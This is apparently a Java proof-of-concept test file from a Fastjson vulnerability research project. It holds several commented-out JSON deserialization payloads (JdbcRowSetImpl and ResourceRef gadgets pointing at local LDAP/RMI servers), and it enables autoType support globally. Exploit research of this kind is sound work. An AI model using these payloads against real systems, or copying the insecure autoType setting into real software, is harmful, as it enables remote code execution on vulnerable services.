package com.threedr3am.bug.fastjson.test;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;
import com.threedr3am.bug.common.server.LdapServer;

/**
 * 挖洞
 *
 * @author threedr3am
 */
public class TestPoc {

    static {
        //rmi server示例
//    RmiServer.run();

        //ldap server示例
//        LdapServer.run();
    }

    public static void main(String[] args) {
//    MockHttpServletRequest mockReq = new MockHttpServletRequest();
//    DefaultSavedRequest request = new DefaultSavedRequest(mockReq, new PortResolver() {
//
//      public int getServerPort(ServletRequest servletRequest) {
//        return 0;
//      }
//    });
//
//    String str = JSON.toJSONString(request, SerializerFeature.WriteClassName);
//    System.out.println(str);

//      String str = "{\"rand1\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},\"rand2\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://localhost:43658\",\"autoCommit\":true}";
//      String str = "{\"b\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://localhost:43658\",\"autoCommit\":true}}";
//    String str = "{\"@type\":\"org.springframework.security.web.savedrequest.DefaultSavedRequest\",\"contextPath\": {\"@type\":\"com.caucho.config.types.ResourceRef\",\"lookupName\": \"ldap://localhost:43658/Calc\"}}";
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
//        String str = "{\"a\": {\"$ref\":\"$.class\"}}";
//        AAA aaa = JSON.parseObject(str, AAA.class);
//        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
//        String str = "{\"a\": {\"$ref\": \"$.a\"}, \"b\": {\"$ref\": \"$.b\"}, \"c\": {\"$ref\": \"$.c\"}, \"d\": {\"$ref\": \"$.d\"}}";
//        JSON.parseObject(str, AAA.class);
//        AAA aaa = new AAA();
//        System.out.println(aaa.getA());
        String json = "{\"\"}";
        JSON.parse(json);
//    JSON.parseObject(str);
    }
}

class AAA {

    private String a;

    public String getA() {
        System.out.println("call the getA method!...");
        return null;
    }

    public void setA(String a) {
        this.a = a;
    }

    public AAA getB() {
        System.out.println("call the getB method!...");
        return null;
    }

    public Object getC() {
        System.out.println("call the getC method!...");
        return null;
    }

    public String getD() {
        System.out.println("call the getD method!...");
        return null;
    }


}
